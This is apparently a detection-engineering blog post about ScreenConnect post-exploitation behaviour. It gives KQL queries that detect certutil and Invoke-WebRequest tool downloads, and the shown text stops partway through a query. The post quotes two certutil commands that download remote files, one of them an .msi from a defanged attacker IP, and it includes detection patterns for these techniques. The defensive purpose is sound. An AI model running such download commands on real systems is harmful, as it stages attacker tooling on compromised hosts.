::: {#mask}
:::
::: wrapper
::: {#header-desktop .desktop}
::: header-wrapper
::: header-title
[KQL Query](/ "Kusto Query Language | KQLQuery.com")
:::
::: menu
::: menu-inner
[Posts](/posts/){.menu-item} [Categories](/categories/){.menu-item}
[whoami](/whoami){.menu-item} [Projects](/projects){.menu-item} [KQL
News](https://kustoinsights.substack.com/){.menu-item
rel="noopener noreffer" target="_blank"}
[](https://github.com/bert-janp "GitHub"){.menu-item
rel="noopener noreffer" target="_blank"}
[](https://twitter.com/BertJanCyber "Twitter"){.menu-item
rel="noopener noreffer" target="_blank"}
[](https://linkedin.com/in/bert-janpals "LinkedIn"){.menu-item
rel="noopener noreffer" target="_blank"} []{.menu-item .delimiter}[
[](javascript:void(0); "Search"){#search-toggle-desktop .search-button
.search-toggle} [](javascript:void(0); "Clear"){#search-clear-desktop
.search-button .search-clear} []{#search-loading-desktop .search-button
.search-loading} ]{#search-desktop .menu-item
.search}[](javascript:void(0); "Switch Theme"){.menu-item .theme-switch}
:::
:::
:::
:::
::: {#header-mobile .mobile}
::: header-container
::: header-wrapper
::: header-title
[KQL Query](/ "Kusto Query Language | KQLQuery.com")
:::
::: {#menu-toggle-mobile .menu-toggle}
:::
:::
::: {#menu-mobile .menu}
::: search-wrapper
::: {#search-mobile .search .mobile}
[](javascript:void(0); "Search"){#search-toggle-mobile .search-button
.search-toggle} [](javascript:void(0); "Clear"){#search-clear-mobile
.search-button .search-clear} []{#search-loading-mobile .search-button
.search-loading}
:::
[Cancel](javascript:void(0);){#search-cancel-mobile .search-cancel}
:::
[Posts](/posts/){.menu-item}[Categories](/categories/){.menu-item}[whoami](/whoami){.menu-item}[Projects](/projects){.menu-item}[KQL
News](https://kustoinsights.substack.com/){.menu-item
rel="noopener noreffer"
target="_blank"}[](https://github.com/bert-janp "GitHub"){.menu-item
rel="noopener noreffer"
target="_blank"}[](https://twitter.com/BertJanCyber "Twitter"){.menu-item
rel="noopener noreffer"
target="_blank"}[](https://linkedin.com/in/bert-janpals "LinkedIn"){.menu-item
rel="noopener noreffer" target="_blank"}
[](javascript:void(0); "Switch Theme"){.menu-item .theme-switch}
:::
:::
:::
::: {.search-dropdown .desktop}
::: {#search-dropdown-desktop}
:::
:::
::: {.search-dropdown .mobile}
::: {#search-dropdown-mobile}
:::
:::
::: {.main role="main"}
::: container
# Detecting Post-Exploitation Behaviour {#detecting-post-exploitation-behaviour .single-title .animate__animated .animate__flipInX}
::: post-meta
::: post-meta-line
[[Bert-Jan Pals](/ "Author"){.author
rel="author"}]{.post-author} [included in
[KQL](/categories/kql/) [Sentinel](/categories/sentinel/) [Defender For
Endpoint](/categories/defender-for-endpoint/) [Detection
Engineering](/categories/detection-engineering/)]{.post-category}
:::
::: post-meta-line
 2024-02-29  1824 words   9 minutes 
:::
:::
::: {#content .content}
The recent ScreenConnect vulnerability (CVE-2024-1709 & CVE-2024-1708)
showed once more why it is so important to detect post-exploitation
behaviour. \@Huntress described in a detailed way which behaviour was
identified, more on that is shared on their blog: *[SlashAndGrab:
ScreenConnect Post-Exploitation in the Wild (CVE-2024-1709 &
CVE-2024-1708)](https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708){target="_blank"
rel="noopener noreffer"}*. The most important takeaway is mentioned in
the last section **most of the post-compromise activities we have
documented in this article aren't novel, original, or outstanding**.
This sentence forms the basis for this blog. Threat Actors ask the
following questions after exploitation:
-   Where am I?
-   What permissions do I have?
-   How can I get access to my hacking tools?
All KQL queries mentioned in this blog and other related are listed in
the [related queries](#related-queries){rel=""} section.
![Detecting Sensitive Group Additions](/svg/loading.min.svg){.lazyload
data-src="/images/post-exploitation/ninjacat.jpeg"
data-srcset="/images/post-exploitation/ninjacat.jpeg, /images/post-exploitation/ninjacat.jpeg 1.5x, /images/post-exploitation/ninjacat.jpeg 2x"
data-sizes="auto"}
## Evaluate Security Solutions
The main question that you should ask when reading similar DFIR reports
is *is this behaviour detected in my environment?* If the answer is
**NO** you have work to do! But how do we know if this behaviour is
detected? That is a simple answer: testing. This part sounds simple but
can be hard since you need a testing environment. The next stage is to
run the found behaviour as mentioned in the DFIR report in your
environment (be aware if you run the explicit commands, you will
download malicious content!!!). For techniques that are not explicitly
mentioned in Threat Intelligence reports, or if you want to test a
different approach, [Atomic Red
Team](https://atomicredteam.io/){target="_blank"
rel="noopener noreffer"} can help you. Atomic Red Team is an open-source
library of tests that security teams can use to simulate MITRE ATT&CK
techniques and with that adversarial activity.
The post-exploitation commands as mentioned by Huntress did result in
multiple alerts (I did not run all the commands). Job done, right? That
depends on your risk appetite, Defender For Endpoint is a black-box SaaS
solution when it comes to out-of-the-box detections, thus there will be
no guarantee that this detection will also trigger the next time these
activities are performed in this sequence. For custom detection this is
different, you know when they run, what they detect and most importantly
they will detect the same behaviour over and over again.
![Defender For Endpoint Detections](/svg/loading.min.svg){.lazyload
data-src="/images/post-exploitation/detections.png"
data-srcset="/images/post-exploitation/detections.png, /images/post-exploitation/detections.png 1.5x, /images/post-exploitation/detections.png 2x"
data-sizes="auto"}
## Building Detections
Before you start writing any line of code for your detection it is
important to have a peek at the Pyramid of Pain. The report mentioned
domains, IP addresses, Files and Hashes but all of those are low-hanging
fruit for detection, they can be changed so easily that they do not
offer a long-term detection solution. Luckily the report contains very
valuable information on the tools & TTPs that the threat actors use. The
TTPs are most valuable to know how they operate since they are
tool-independent.
![Pyramid of Pain by David Bianco](/svg/loading.min.svg){.lazyload
data-src="/images/threat-report-to-hunting-query/blog-pyramid-pain-01-768x432.jpg"
data-srcset="/images/threat-report-to-hunting-query/blog-pyramid-pain-01-768x432.jpg, /images/threat-report-to-hunting-query/blog-pyramid-pain-01-768x432.jpg 1.5x, /images/threat-report-to-hunting-query/blog-pyramid-pain-01-768x432.jpg 2x"
data-sizes="auto"}
> **Detection Logic** The detections in the blog are KQL based, but the
> logic of these detections can be translated to other platforms.
## Certutil Remote Download
On multiple occasions, the Living of the Land Binary *Certutil.exe*,
which is a binary used for handling certificates, is mentioned as an
abused tool. Mapping this to the Pyramid of Pain would result in the
tool Certutil being used and the related TTP is a remote file download.
Two examples of this behaviour are shown below.
Examples:
::: highlight
``` {tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"}
certutil.exe -urlcache -split -f http://7-zip[.]org/a/7z1604-x64.exe 7zip.exe
certutil  -urlcache -f http[:]//23.26.137[.]225:8084/msappdata.msi c:\mpyutd.msi
```
:::
Sources:
[Huntress](https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708){target="_blank"
rel="noopener noreffer"} & [LOLBAS
Project](https://lolbas-project.github.io/lolbas/Binaries/Certutil/){target="_blank"
rel="noopener noreffer"}
Based on the examples detections can be crafted. Since it is related to
remote downloads via the commandline two tables can be used for the
detection, *DeviceProcessEvents* or *DeviceNetworkEvents*. The logic in
both detections is similar, first filtering on processes/connections
started by Certutil, thereafter the commandline must contain HTTP (thus
will also trigger for HTTPS), urlcache in combination with -f for the
remote download. The -f parameter fetches the specific URL and thereby
updates the cache. In this case, has_any() is used because the
commandline should contain those 3 parameters, but the order can be
different.
Query Process Based:
::: highlight
``` {tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"}
DeviceProcessEvents
| where FileName == "certutil.exe"
| where tolower(ProcessCommandLine) has_all ("http", "urlcache", "-f")
| project-reorder Timestamp, ProcessCommandLine, FileName, InitiatingProcessAccountUpn
```
:::
Network Process Based:
::: highlight
``` {tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"}
DeviceNetworkEvents
| where InitiatingProcessFileName == "certutil.exe"
| where tolower(InitiatingProcessCommandLine) has_all ("http", "urlcache", "-f")
| project-reorder Timestamp, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessAccountUpn
```
:::
## Tool download via Invoke-Webrequest
Another tool that can be leveraged by adversaries to remotely download
files is PowerShell. Adversaries may abuse PowerShell commands and
scripts for execution or in the case of ScreenConnect post-exploitation
activities to collect their tools. The function Invoke-Webrequest is in
that case abused to remotely download the script to the local file
system.
Oversimplified the detection that can be used is:
::: highlight
``` {tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"}
DeviceNetworkEvents
| where InitiatingProcessCommandLine has "Invoke-Webrequest"
```
:::
This works, but you probably get a lot of results. Thus the query is
equipped with filtering options to tweak it a bit to your environment.
Since the network request originating from *Invoke-Webrequest* can be
expected for certain workloads in your environment an additional filter
is added, to for example only alert on servers if this behaviour is
found. Furthermore, a different filter can be leveraged, this filter
only shows the Invoke-Webrequest in combination with an IPv4 in the
*InitiatingProcessCommandLine*. Most of the benign activities will go to
a URL/Domain instead of downloading it directly from a folder on an
IPv4. The finetuning of this (and others) should be done based on the
baseline of your environment.
::: highlight
``` {tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"}
let IPRegex = '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}';
let AllowedDomains = dynamic(['google.com']);
let Servers = DeviceInfo
    | where Timestamp > ago(30d)
    | summarize arg_max(Timestamp, *) by DeviceId
    | where DeviceType == "Server"
    | distinct DeviceId;
DeviceNetworkEvents
| where InitiatingProcessCommandLine has "Invoke-Webrequest"